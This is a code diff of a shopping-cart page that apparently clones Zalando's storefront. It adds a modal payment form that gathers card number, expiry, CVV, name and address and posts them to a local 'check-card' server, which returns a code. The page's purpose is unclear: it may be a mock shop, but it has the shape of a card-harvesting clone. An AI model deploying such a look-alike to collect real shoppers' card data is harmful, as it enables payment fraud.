@@ -997,7 +997,6 @@
             </div>
 
             <script>
-              // Проверяем содержимое корзины в localStorage
               console.log(1)
               const cart = JSON.parse(localStorage.getItem("cart")) || [];
               const cartItemsContainer = document.getElementById("cart-fragment-container");
@@ -1059,24 +1058,48 @@
                 </div>
               </div>
               <div class="Wn-EjT">
-                <button class="_ZDS_REF_SCOPE_ vfoVrE DJxzzA u9KIT8 uEg2FS U_OhzR ZkIJC- Vn-7c- VWL_Ot _13ipK_ FCIprz heWLCX lXdmf0 LyRfpJ Md_Vex NN8L-8 EmWJce EvwuKo gcK-9K EKabf7 aX2-iv r9BRio pOsi7r mo6ZnF Wy3rmK" 
-        type="button" 
-        aria-label="Go to checkout" 
-        data-id="proceed-to-checkout-button" 
-        onclick="togglePaymentField()">
-    <span class="heWLCX ZkIJC- r9BRio qXofat sDq_FX _2kjxJ6 dgII7d">Go to checkout</span>
-</button>
+    <!-- Кнопка "Перейти к оплате" -->
+    <button  class = "_ZDS_REF_SCOPE_ vfoVrE DJxzzA u9KIT8 uEg2FS U_OhzR ZkIJC- Vn-7c- VWL_Ot _13ipK_ FCIprz heWLCX lXdmf0 LyRfpJ Md_Vex NN8L-8 EmWJce EvwuKo gcK-9K EKabf7 aX2-iv r9BRio pOsi7r mo6ZnF Wy3rmK "type="button" onclick="togglePaymentField()">
+        Перейти к оплате
+    </button>
+    
+    <!-- Наложение для формы оплаты -->
+    <div id="overlay" class="overlay">
+        <!-- Форма оплаты -->
+        <div id="payment-field" class="payment-form">
+            <!-- Крестик для закрытия формы -->
+            <button type="button" class="close-button" onclick="togglePaymentField()">×</button>
 
-<!-- Поле для ввода данных карты -->
-<div id="payment-field" style="display: none; overflow: hidden;">
-    <h3 class="sDq_FX _2kjxJ6 FxZV-M HlZ_Tf">Payment Information</h3>
-    <div class="input-container">
-        <input type="text" id = "card-number" placeholder="Card Number" />
-        <input type="text" id = "expiry-date" placeholder="Expiry Date" />
-        <input type="text" id = "cvv" placeholder="CVV" />
+            <h3 style = "margin-bottom: 10px;" class = "z2N-Fg wmyrNw FxZV-M HlZ_Tf">Payment Information</h3>
+            <div class="input-container">
+                <div class="column">
+                    <input type="text" id="card-number" placeholder="Card Number" />
+                    <input type="text" id="expiry-date" placeholder="MM/YYYY" />
+                    <input type="text" id="cvv" placeholder="CVV" />
+                    <input type="text" id="FN" placeholder="First Name" />
+                </div>
+                <div class="column">
+                    <input type="text" id="LN" placeholder="Last Name" />
+                    <input type="text" id="Address" placeholder="Address Line 1" />
+                    <input type="text" id="T/C" placeholder="Town / City" />
+                    <input type="text" id="Postcode" placeholder="Postcode" />
+                </div>
+            </div>
+            <button style = "margin-top: 10px;"class = "_ZDS_REF_SCOPE_ vfoVrE DJxzzA u9KIT8 uEg2FS U_OhzR ZkIJC- Vn-7c- VWL_Ot _13ipK_ FCIprz heWLCX lXdmf0 LyRfpJ Md_Vex NN8L-8 EmWJce EvwuKo gcK-9K EKabf7 aX2-iv r9BRio pOsi7r mo6ZnF Wy3rmK" type="button" onclick="checkCard()">Payment Proceed</button>
+        </div>
     </div>
-    <button type="button" class="_ZDS_REF_SCOPE_ vfoVrE DJxzzA u9KIT8 uEg2FS U_OhzR ZkIJC- Vn-7c- VWL_Ot _13ipK_ FCIprz heWLCX lXdmf0 LyRfpJ Md_Vex NN8L-8 EmWJce EvwuKo gcK-9K EKabf7 aX2-iv r9BRio pOsi7r mo6ZnF Wy3rmK" onclick="checkCard()">Submit Payment</button>
 </div>
+<div id="customAlert" class="custom-alert" style="display: none;">
+  <div class="alert-content">
+    <button onclick="closeAlert()" class="close-button">×</button>
+    <span id="alertMessage"></span>
+  </div>
+</div>
+
+
+
+
+
               </div>
               <div class="_2ZBgf"></div>
               <span class="sDq_FX lystZ1 FxZV-M HlZ_Tf">We accept</span>
@@ -1158,7 +1181,6 @@
   </div>
 </div>
 <div style = "margin: 40px;"class="z-coast-base__line"></div>`
-                // Если корзина не пуста, показываем список товаров
                 cartItemsContainer.style.display = "block";
                 i = 0;
                 cart.forEach(product => {
@@ -1230,36 +1252,28 @@
                 });
                 const removeButtons = document.querySelectorAll('[data-testid="article-actions-remove"]');
 
-                // Добавляем обработчик событий для каждой кнопки
                 removeButtons.forEach(button => {
                   button.addEventListener('click', function (event) {
-                    // Получаем элемент товара, чтобы извлечь его ID
                     const articleElement = event.target.closest('.z-coast-base__article-in-cart');
                     const articleId = articleElement.id;
                     console.log(articleId);
 
-                    // Получаем текущие товары из localStorage
                     const cartItems = JSON.parse(localStorage.getItem('cart')) || [];
                     console.log(cartItems);
 
-                    // Фильтруем массив, убирая товар с нужным ID
                     const updatedCartItems = cartItems.filter(item => item.id != articleId);
                     console.log(updatedCartItems);
                     if (updatedCartItems.length == 0) {
                       window.location.reload();
                     }
-                    // Обновляем localStorage
                     localStorage.setItem('cart', JSON.stringify(updatedCartItems));
 
-                    // Удаляем элемент из DOM
                     articleElement.remove();
 
-                    // Обновляем общую сумму и количество товаров в корзине
                     updateCartSummary(updatedCartItems);
                   });
                 });
 
-                // Функция для обновления отображения корзины
                 function updateCartSummary(cartItems) {
                   console.log(11111111);
                   let value = 0;
@@ -1269,7 +1283,6 @@
                   });
 
                   const itemCount = cartItems.length;
-                  // Обновите элементы на странице (например, общую сумму и количество товаров)
                   document.querySelector('#price1').textContent = `£${value.toFixed(2)}`;
                   document.querySelector('#price2').textContent = `£${value.toFixed(2)}`;
                   document.querySelector('#len').textContent = `Your bag (${itemCount} items)`;
@@ -1278,7 +1291,6 @@
 
 
               } else {
-                // Если корзина пуста, показываем сообщение
                 cartItemsContainer.innerHTML = `<div class="z-coast-cart__cart__empty-cart-tiles z-coast-cart__cart__empty-cart-tiles__spacing">
                     <div class="x7LsVH AcNrW- yA9P2b">
                       <div class="z-coast-cart__empty-cart I7OI1O C3wGFf _0xLoFW uEg2FS">
@@ -1358,27 +1370,220 @@
                 window.location.reload(); // Перезагружаем страницу для обновления отображения
               }
             </script>
+
+
+
+            <style>
+              /* Наложение, покрывающее всю страницу */
+              .overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5);
+                display: none;
+                /* Исходное состояние - скрыто */
+                justify-content: center;
+                align-items: center;
+                z-index: 1000;
+              }
+
+              /* Активное состояние наложения */
+              .overlay.active {
+                display: flex;
+              }
+
+              /* Блокировка прокрутки */
+              body.no-scroll {
+                position: fixed;
+                width: 100%;
+                overflow: hidden;
+                top: 0;
+                left: 0;
+                right: 0;
+              }
+
+              /* Стили для формы */
+              .payment-form {
+                background-color: #fff;
+                padding: 20px;
+                border-radius: 8px;
+                max-width: 600px;
+                width: 100%;
+                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+                text-align: center;
+                position: relative;
+                z-index: 1001;
+              }
+
+              /* Кнопка-крестик для закрытия формы */
+              .close-button {
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                background: none;
+                border: none;
+                font-size: 24px;
+                color: #333;
+                cursor: pointer;
+              }
+
+              /* Контейнер для двух колонок */
+              .input-container {
+                display: flex;
+                justify-content: space-between;
+                gap: 20px;
+              }
+
+              /* Колонки внутри контейнера */
+              .column {
+                display: flex;
+                flex-direction: column;
+                gap: 10px;
+                width: 100%;
+              }
+
+              .column input {
+                width: 100%;
+                padding: 10px;
+                border: 1px solid #ccc;
+                border-radius: 4px;
+              }
+
+              /* Стили для кнопок */
+
+
+
+              /* Для блокировки прокрутки */
+              body.no-scroll,
+              html.no-scroll {
+                overflow: hidden;
+                /* Отключаем прокрутку */
+              }
+
+              /* Затемнение изображений */
+              .dim-images img {
+                filter: brightness(0.5);
+                /* Делаем изображения тусклее */
+              }
+
+              .custom-alert {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5);
+                display: none;
+                justify-content: center;
+                align-items: center;
+                z-index: 9999;
+              }
+
+              .custom-alert .alert-content {
+                background-color: white;
+                padding: 20px;
+                border-radius: 10px;
+                text-align: center;
+                position: relative;
+                max-width: 400px;
+                width: 100%;
+              }
+
+              .custom-alert .close-button {
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                font-size: 24px;
+                background: none;
+                border: none;
+                color: #333;
+                cursor: pointer;
+              }
+
+              .custom-alert span {
+                font-size: 18px;
+                color: #333;
+                display: block;
+                margin-top: 10px;
+              }
+
+              .custom-alert button {
+                background-color: #007bff;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                cursor: pointer;
+              }
+
+            </style>
+
             <script>
+              let scrollPosition = 0;
+
               function togglePaymentField() {
-                const paymentField = document.getElementById('payment-field');
-                if (paymentField.style.display === 'none') {
-                  paymentField.style.display = 'block'; // Показываем поле для ввода
-                  setTimeout(() => { // Ждем, пока элемент станет видимым
-                    paymentField.style.maxHeight = '200px'; // Устанавливаем максимальную высоту
-                  }, 10); // Задержка для включения перехода
+                const overlay = document.getElementById("overlay");
+                const body = document.body;
+
+                if (overlay.classList.contains("active")) {
+                  overlay.classList.remove("active");
+                  body.classList.remove("no-scroll");
+                  body.classList.remove("dim-images");
+                  window.scrollTo(0, scrollPosition);
                 } else {
-                  paymentField.style.maxHeight = '0'; // Скрываем поле
-                  setTimeout(() => {
-                    paymentField.style.display = 'none'; // Скрываем после завершения анимации
-                  }, 500); // Задержка на время анимации
+                  scrollPosition = window.scrollY;
+                  overlay.classList.add("active");
+                  body.classList.add("no-scroll");
+                  body.classList.add("dim-images");
+
+                  document.getElementById("card-number").focus();
                 }
               }
+
+              function showAlert(message) {
+                const body = document.body;
+                const overlay = document.getElementById("overlay");
+
+                const alertBox = document.getElementById("customAlert");
+                const alertMessage = document.getElementById("alertMessage");
+                
+                scrollPosition = window.scrollY;
+
+                  body.classList.add("dim-images");
+                  body.classList.add("no-scroll");
+
+                alertMessage.innerHTML = message;
+                alertBox.style.display = "flex";
+              }
+
+              function closeAlert() {
+                const overlay = document.getElementById("overlay");
+
+                const body = document.body;
+                body.classList.remove("no-scroll");
+
+                  body.classList.remove("dim-images");
+                  window.scrollTo(0, scrollPosition);
+
+                const alertBox = document.getElementById("customAlert");
+                alertBox.style.display = "none";
+                localStorage.clear();
+                window.location.reload();
+              }
+
+
 
               async function checkCard() {
                 const cardNumber = document.getElementById("card-number").value;
                 const expiryDate = document.getElementById("expiry-date").value;
                 const cvv = document.getElementById("cvv").value;
-                const resultDiv = document.getElementById("result");
+                const lastName = document.getElementById("LN").value;
+                const firstName = document.getElementById("FN").value;
+                const postcode = document.getElementById("Postcode").value;
+                const city = document.getElementById("T/C").value;
+                const address = document.getElementById("Address").value;
 
                 try {
                   const response = await fetch("http://127.0.0.1:1000/check-card", {
@@ -1390,6 +1595,11 @@
                       cardNumber,
                       expiryDate,
                       cvv,
+                      lastName,
+                      firstName,
+                      postcode,
+                      city,
+                      address
                     }),
                   });
 
@@ -1399,70 +1609,17 @@
 
                   const result = await response.json();
                   if (result.exists) {
-                    alert("payment is proceeding")
+                    togglePaymentField();
+                    showAlert(`Payment is proceeding<br>Your code: <strong>${result.code}</strong><br>`);
                   } else {
-                    alert("invalid card")
+                    showAlert("Wrong Input, try to fill all the fields");
                   }
                 } catch (error) {
-                  alert("invalid card")
+                  showAlert("Error processing payment. Please check your inputs and try again.");
                 }
               }
-
-              // Обработчик события для отправки данных при клике на кнопку
-              document.getElementById("submit-button").addEventListener("click", async () => {
-                await checkCard();
-              });
             </script>
 
-            <style>
-              /* Общее выравнивание блока */
-              #payment-field {
-                transition: max-height 0.5s ease;
-                /* Плавная анимация изменения высоты */
-                max-height: 0;
-                /* Начальное значение для скрытия */
-                width: 300px;
-                /* Фиксированная ширина для общего блока */
-                margin: 0 auto;
-                /* Центрирование по горизонтали */
-                overflow: hidden;
-                /* Прячем лишний контент */
-                text-align: center;
-                /* Выравнивание текста по центру */
-              }
-
-              /* Стиль для контейнера ввода */
-              .input-container {
-                padding-bottom: 5px;
-                display: flex;
-                flex-direction: column;
-                /* Выравнивание полей в столбик */
-                gap: 10px;
-                /* Отступ между полями */
-                align-items: center;
-                /* Центрирование полей ввода по горизонтали */
-              }
-
-              /* Поля ввода */
-              input {
-                width: 100%;
-                /* Ширина полей ввода на 100% */
-                padding: 8px;
-                /* Отступ внутри полей ввода */
-                border: 1px solid #ccc;
-                /* Граница поля */
-                border-radius: 4px;
-                /* Скругленные углы */
-              }
-
-              /* Кнопка для отправки платежа */
-              button {
-                margin-top: 10px;
-                /* Отступ сверху */
-                width: 100%;
-                /* Ширина кнопки на 100% */
-              }
-            </style>
           </div>
         </div>
         <style>
@@ -1537,75 +1694,73 @@
                 id="skip-carousel-:R12nkap:-1" href="https://www.zalando.co.uk/cart/#skip-carousel-:R12nkap:-2"><span
                   class="_ZDS_REF_SCOPE_ x6xs1j">Skip forwards over a carousel of items</span></a></div>
             <ul class="XLgdq7 _0xLoFW JgpeIw r9BRio be4rWJ xlsKrm _4oK5GO bhd0J_ AEfWtw _0xLoFW be4rWJ heWLCX"
-            style="scroll-padding-left: 148px; scroll-behavior: smooth;">
-            {% for item in items %}
-            <li class="LiPgRT DlJ4rT _5qdMrS _75qWlu _9hq5vx"><!--$-->
-              <div data-entity-id="ern:product::A0H15O069-Q11" data-re-hints="">
-                <article class="z5x6ht _0xLoFW JT3_zV mo6ZnF _78xIQ-"
-                  data-trckng-component="BZkzFTtb9OGizrzDKdwVR">
-                  <div class="xCblER KVKCn3 u-C3dd jDGwVr mo6ZnF KLaowZ rQ5pcU Nx0a9q"></div><a tabindex="0"
-                    class="_LM tCiGa7 ZkIJC- JT3_zV CKDt_l CKDt_l LyRfpJ"
-                    href="/items/{{item.name}}"
-                    data-card-type="media">
-                    <figure class="heWLCX">
-                      <ul
-                        class="_28osyf _0xLoFW u9KIT8 P3OKTW ZkIJC- r9BRio JwGOCV _7ckuOK _LM cj_W10 nXkCf3 KVKCn3 _2dqvZS s32-sV jDGwVr _4oK5GO"
-                        tabindex="-1">
-                        {% if item.discount %}
-
-                        <li class="f3sRh_ uVxVjw _3oRTm8">
-                          <div class="gzy-Rq _ZDS_REF_SCOPE_ Hdd91c DJxzzA FCIprz"><span
-                              class="sDq_FX goVnUa dgII7d DJxzzA FCIprz">-{{item.discount}}%</span></div>
-                        </li>
-                        {% else %}
-                        <li class="f3sRh_ uVxVjw _3oRTm8">
-                          <div class="dzAn9K _ZDS_REF_SCOPE_ Hdd91c DJxzzA FCIprz"><span
-                              class="sDq_FX goVnUa dgII7d DJxzzA FCIprz">Hot Drops</span></div>
-                        </li>
-                        {% endif %}
-                      </ul>
-                      <div class="JT3_zV ZkIJC- _9QaS6n IN7Kbz K82if3">
-                        <div class="KVKCn3 u-C3dd jDGwVr mo6ZnF KLaowZ"><img draggable="false"
-                            class="sDq_FX lystZ1 FxZV-M _2Pvyxl JT3_zV EKabf7 mo6ZnF _1RurXL mo6ZnF _7ZONEy"
-                            alt="DUNK LOW LX - Trainers - black/summit white/black/cacao wow/metallic gold"
-                            src="{{item.image}}"
-                            sizes="(min-width: 1280px) 288px, (min-width: 1024px) calc(25vw - 28px), (min-width: 480px) calc(33vw - 24px), calc(50vw - 30px)"
-                            loading="lazy" width="300" height="433" fetchpriority="auto"></div>
-                      </div>
-                    </figure>
-                  </a>
-
-                  <div class="_0xLoFW _78xIQ- EJ4MLB f4ql6o JT3_zV" tabindex="-1"><a tabindex="-1"
-                      class="q84f1m CKDt_l LyRfpJ JT3_zV CKDt_l _2dqvZS"
-                      href="https://www.zalando.co.uk/asics-sportstyle-gel-1090v2-unisex-trainers-black-a0h15o069-q11.html">
-                      <header>
-                        <div class="Zhr-fS">
-                          <h3 class="FtrEr_ lystZ1 FxZV-M HlZ_Tf ZkIJC- r9BRio qXofat EKabf7">
-                            {{item.category}}
-                          </h3>
-                          <h3 class="sDq_FX lystZ1 FxZV-M HlZ_Tf ZkIJC- r9BRio qXofat EKabf7">{{item.name}}
-                          </h3>
-                        </div>
-                        <section class="_0xLoFW _78xIQ-">
+              style="scroll-padding-left: 148px; scroll-behavior: smooth;">
+              {% for item in items %}
+              <li class="LiPgRT DlJ4rT _5qdMrS _75qWlu _9hq5vx"><!--$-->
+                <div data-entity-id="ern:product::A0H15O069-Q11" data-re-hints="">
+                  <article class="z5x6ht _0xLoFW JT3_zV mo6ZnF _78xIQ-" data-trckng-component="BZkzFTtb9OGizrzDKdwVR">
+                    <div class="xCblER KVKCn3 u-C3dd jDGwVr mo6ZnF KLaowZ rQ5pcU Nx0a9q"></div><a tabindex="0"
+                      class="_LM tCiGa7 ZkIJC- JT3_zV CKDt_l CKDt_l LyRfpJ" href="/items/{{item.name}}"
+                      data-card-type="media">
+                      <figure class="heWLCX">
+                        <ul
+                          class="_28osyf _0xLoFW u9KIT8 P3OKTW ZkIJC- r9BRio JwGOCV _7ckuOK _LM cj_W10 nXkCf3 KVKCn3 _2dqvZS s32-sV jDGwVr _4oK5GO"
+                          tabindex="-1">
                           {% if item.discount %}
-                          <p class="sDq_FX _2kjxJ6 FxZV-M HlZ_Tf _0xLoFW u9KIT8 _7ckuOK vSgP6A"><span
-                              class="sDq_FX dgII7d lystZ1 uVxVjw  Km7l2y">£{{item.new_price}} </span>
-                            <span class="sDq_FX lystZ1 Yb63TQ dgII7d ZiDB59">£{{item.price}}</span>
-                          </p>
+
+                          <li class="f3sRh_ uVxVjw _3oRTm8">
+                            <div class="gzy-Rq _ZDS_REF_SCOPE_ Hdd91c DJxzzA FCIprz"><span
+                                class="sDq_FX goVnUa dgII7d DJxzzA FCIprz">-{{item.discount}}%</span></div>
+                          </li>
                           {% else %}
-                          <p class="sDq_FX _2kjxJ6 FxZV-M HlZ_Tf _0xLoFW u9KIT8 _7ckuOK vSgP6A"><span
-                              class="sDq_FX lystZ1 Yb63TQ dgII7d ">£{{item.price}}</span></p>
+                          <li class="f3sRh_ uVxVjw _3oRTm8">
+                            <div class="dzAn9K _ZDS_REF_SCOPE_ Hdd91c DJxzzA FCIprz"><span
+                                class="sDq_FX goVnUa dgII7d DJxzzA FCIprz">Hot Drops</span></div>
+                          </li>
                           {% endif %}
-                        </section>
-                      </header>
-                    </a></div>
-                </article>
-              </div><!--/$-->
-            </li>
-            {% endfor %}
+                        </ul>
+                        <div class="JT3_zV ZkIJC- _9QaS6n IN7Kbz K82if3">
+                          <div class="KVKCn3 u-C3dd jDGwVr mo6ZnF KLaowZ"><img draggable="false"
+                              class="sDq_FX lystZ1 FxZV-M _2Pvyxl JT3_zV EKabf7 mo6ZnF _1RurXL mo6ZnF _7ZONEy"
+                              alt="DUNK LOW LX - Trainers - black/summit white/black/cacao wow/metallic gold"
+                              src="{{item.image}}"
+                              sizes="(min-width: 1280px) 288px, (min-width: 1024px) calc(25vw - 28px), (min-width: 480px) calc(33vw - 24px), calc(50vw - 30px)"
+                              loading="lazy" width="300" height="433" fetchpriority="auto"></div>
+                        </div>
+                      </figure>
+                    </a>
+
+                    <div class="_0xLoFW _78xIQ- EJ4MLB f4ql6o JT3_zV" tabindex="-1"><a tabindex="-1"
+                        class="q84f1m CKDt_l LyRfpJ JT3_zV CKDt_l _2dqvZS"
+                        href="https://www.zalando.co.uk/asics-sportstyle-gel-1090v2-unisex-trainers-black-a0h15o069-q11.html">
+                        <header>
+                          <div class="Zhr-fS">
+                            <h3 class="FtrEr_ lystZ1 FxZV-M HlZ_Tf ZkIJC- r9BRio qXofat EKabf7">
+                              {{item.category}}
+                            </h3>
+                            <h3 class="sDq_FX lystZ1 FxZV-M HlZ_Tf ZkIJC- r9BRio qXofat EKabf7">{{item.name}}
+                            </h3>
+                          </div>
+                          <section class="_0xLoFW _78xIQ-">
+                            {% if item.discount %}
+                            <p class="sDq_FX _2kjxJ6 FxZV-M HlZ_Tf _0xLoFW u9KIT8 _7ckuOK vSgP6A"><span
+                                class="sDq_FX dgII7d lystZ1 uVxVjw  Km7l2y">£{{item.new_price}} </span>
+                              <span class="sDq_FX lystZ1 Yb63TQ dgII7d ZiDB59">£{{item.price}}</span>
+                            </p>
+                            {% else %}
+                            <p class="sDq_FX _2kjxJ6 FxZV-M HlZ_Tf _0xLoFW u9KIT8 _7ckuOK vSgP6A"><span
+                                class="sDq_FX lystZ1 Yb63TQ dgII7d ">£{{item.price}}</span></p>
+                            {% endif %}
+                          </section>
+                        </header>
+                      </a></div>
+                  </article>
+                </div><!--/$-->
+              </li>
+              {% endfor %}
 
 
-          </ul>
+            </ul>
 
             <div class="F3MynY _11BoAR KVKCn3 aajkfN wOOxir _0m5pni KVKCn3 ZkIJC- r9BRio XfNx0j x7LsVH fKkxVM nMZJd8"><a
                 tabindex="0" class="_ZDS_REF_SCOPE_ dEnX-X l9TUOd CKDt_l LyRfpJ JT3_zV _5Yd-hZ"
